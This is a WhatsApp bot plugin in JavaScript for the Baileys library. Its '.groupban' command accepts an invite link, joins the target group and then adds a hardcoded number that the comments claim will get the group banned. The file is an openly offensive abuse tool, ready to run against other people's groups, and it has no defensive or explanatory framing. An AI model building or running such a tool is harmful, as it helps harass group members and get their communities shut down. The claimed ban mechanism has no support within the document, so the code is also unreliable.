// plugins/groupban.js
// Command: .groupban [link or groupId]
// Description: Ban a group by joining it via invite link and executing the ban function.

const { isJidGroup } = require('@whiskeysockets/baileys'); // adjust import if needed

/**
 * Ban a group by adding the "ban number" to it.
 * @param {string} target - Group JID (e.g., "123456789@g.us")
 * @param {WAConnection} sock - Baileys socket instance
 */
async function groupBan(target, sock) {
    if (!target.endsWith('@g.us')) throw new Error('Invalid group ID: must end with @g.us');

    try {
        // The number below is the one that triggers the ban.
        // You can change it to any number you want.
        const banNumber = '13135550002@s.whatsapp.net';
        await sock.groupParticipantsUpdate(target, [banNumber], 'add');
        return true;
    } catch (error) {
        throw new Error(`Ban failed: ${error.message}`);
    }
}

/**
 * Extract invite code from a WhatsApp group link.
 * Supports: https://chat.whatsapp.com/CODE
 * @param {string} link - Full invite link or just the code
 * @returns {string} Invite code
 */
function extractInviteCode(link) {
    // Remove protocol and domain, keep only the code
    const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
    if (match) return match[1];
    // If it's already just the code, return as is
    if (/^[a-zA-Z0-9]{22}$/.test(link)) return link;
    throw new Error('Invalid group invite link or code');
}

/**
 * Resolve a group invite link to a group JID.
 * @param {string} link - Invite link or code
 * @param {WAConnection} sock - Baileys socket
 * @returns {Promise<string>} Group JID (e.g., "123456789@g.us")
 */
async function resolveGroupLink(link, sock) {
    const code = extractInviteCode(link);
    try {
        // Accept the invite to get group info
        const result = await sock.groupAcceptInvite(code);
        // result is usually the group JID
        if (result && typeof result === 'string' && result.endsWith('@g.us')) {
            return result;
        }
        // Some versions return an object with 'gid'
        if (result.gid && result.gid.endsWith('@g.us')) {
            return result.gid;
        }
        throw new Error('Could not retrieve group ID from invite');
    } catch (error) {
        throw new Error(`Failed to join group via invite: ${error.message}`);
    }
}

/**
 * Main plugin export.
 * @param {Object} bot - Bot instance (contains sock, commands, etc.)
 */
module.exports = (bot) => {
    // Get the socket (assumes bot has sock property)
    const sock = bot.sock;

    // Command definition
    const command = {
        name: 'groupban',
        aliases: ['band-group'], // optional alias from your snippet
        description: 'Ban a group by invite link or group ID',
        usage: '.groupban [link or groupId]',
        category: 'Owner',
        ownerOnly: true, // if your framework supports this flag
        async execute(m, args, Reply) {
            // Permission check: only bot owner/creator can use this
            // Replace with your actual owner checking logic
            const isOwner = m.sender === bot.ownerNumber; // or use CreatorOnly variable
            if (!isOwner) {
                return Reply('❌ Only the bot owner can use this command.');
            }

            // Check if it's a group chat (just a safety – command can be used anywhere)
            // The actual target is passed as argument, so even in private chat it's fine.

            // Get the target from arguments
            const targetArg = args[0];
            if (!targetArg) {
                return Reply(`❌ Please provide a group invite link or group ID.\nExample: .groupban https://chat.whatsapp.com/AbCdEfGhIjKlMnOpQrStUv`);
            }

            let groupId = targetArg;

            // If it's already a valid group JID, use it directly
            if (groupId.endsWith('@g.us')) {
                // it's a group ID
            } else {
                // Treat as invite link and resolve
                try {
                    Reply('⏳ Resolving invite link and joining group...');
                    groupId = await resolveGroupLink(targetArg, sock);
                    Reply(`✅ Successfully joined group: ${groupId}`);
                } catch (error) {
                    return Reply(`❌ ${error.message}`);
                }
            }

            // Now execute the ban
            try {
                Reply(`⏳ Attempting to ban group: ${groupId} ...`);
                await groupBan(groupId, sock);
                Reply(`✅ Group ${groupId} has been banned successfully.`);
            } catch (error) {
                Reply(`❌ ${error.message}`);
                // Optionally leave the group if join succeeded but ban failed?
                // You can add logic here to leave the group if needed.
            }
        }
    };

    // Register the command (assuming bot has a command handler)
    // If your framework uses a different registration method, adjust accordingly.
    // Example for a handler that expects a .registerCommand method:
    if (typeof bot.registerCommand === 'function') {
        bot.registerCommand(command);
    } else {
        // Fallback: attach to a global commands map
        if (!global.commands) global.commands = new Map();
        global.commands.set(command.name, command);
        (command.aliases || []).forEach(alias => global.commands.set(alias, command));
    }
};
